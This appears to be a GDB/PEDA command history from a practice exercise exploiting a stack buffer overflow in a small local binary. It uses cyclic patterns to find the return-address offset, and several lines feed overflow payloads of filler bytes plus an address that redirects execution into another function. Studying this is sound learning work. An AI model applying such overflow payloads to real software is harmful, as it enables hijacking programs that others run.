python
print('a'*104)
r
clear
r
r
checksec
clear
r
info r
ls
clear
r
disas exe
info r
start i
info r
clear
list
clear
disas main
pattern_create 200
r
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
pattern_create 500
r
info r rsp
x/xg $rsp
x/xg $rsp
x/cg $rsp
x/sg $rsp
x/cg $rsp
x/8cg $rsp
x/8sg $rsp
x/xg $rsp
~AA;AA)AA
pattern_offset 0x41412941413b4141
r
clear
clear
r
clear
pattern_create 500
clear
r
inro r rsp
info r rsp
x/xg $rsp
pattern_offset 0x41412941413b4141
r
r
r
R
r
r
pattern_create 500
r
x/xg $rsp
clear
disas vuln
r
x/x8 $rsp
x/x $rsp
r
r
info r
r
r
r
x/4c $rip
r
r
x/32xg $rbp-14
x/32xg $rsp
r
r
r
aaaaaaaaaaaaaaaaaaaaaaaaaaaa0000\xd9\x11\x40
r
bt
ls
clear
disas vuln
break *(vuln+23)
r
r
r
r
bt
disas vuln
r
ls
cat peda-session-vuln.exe.txt
disas vuln
break *(vuln+0)
r
info frame
disas exec
disas exe
break *(exe+97)
break *(exe+98)
r
info frame
disas vuln
ls
cat vuln.c
x/xg $rbp
x/xg $rip
disas vuln
disas exec
disas exe
break *(exe+82)
r
info frame
disas main
c
info frame
disas main
disas exe
disas vuln
info frame
r
info frame
c
info frame
c
info frame
c
info frame
clear
r
aaaaaaaaaaaaaaaaaaaaaaaaaaaaÙ@
aaaaaaaaaaaaaaaaaaaaaaaaaaaaÙ@
r
info f
c
info f
disas vuln
disas main
disas exe
r
c
info f
c
c
c
c
info f
info functions vuln
r
aaaaaaaaaaaaaaaaaaaaaaaaaaaahi
c
info f
aaaaaaaaaaaaaaaaaaaaaaaaaaaallEh
r
c
info f
r
c
info f
clear
pattern_create 500
r
clear
r AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
x/xg $rsp
pattern_offset 0x4441412841412d41
disas vuln
r < exp.txt
bt
clear
disas vuln
break *(vuln+0)
r < exp.txt
info f
start i
start i < exp.txt
info f
disas exp
disas exe
break *(exe+78)
break *(exe+0)
clear
c
clear *0x0000000000401176
clear 0x0000000000401176
delete *0x0000000000401176
break *(exe+12>
break *(exe+12)
info break
clear break 0x0000000000401176
clear 5
cleardel 5
del 5
info break
start i < exp.txt
c
info f
disas main
c
info f
c
cat exp.txt
r aaaaaaaaaaaaaaaaaaaaÆ@
c
info f
c
bt
r < exp.txt
c
info f
x/16xg $rsp
x/16xg $rbp-0x14
disas exe
x/16xg $rbp-0x18
x/16xg $rbp-0xc
info f
r < exp.txt
c
disas exe
break *(exe+45)
r < exp.txt
c
x/16xg $rbp-0xc
x/16xg $rbp-0x18
x/16xg $rbp-0x14
x/64xg $rbp-0x14
disas vuln
r < exp.txt
info f
c
info f
c
info break
disas exe
break *(exe+78)
r < exp.txt
c
c
r < exp.txt
c
c
info break
r < exp.txt
c
info f
n
r
c
s
r
r < exp.txt
s
clear
gcc
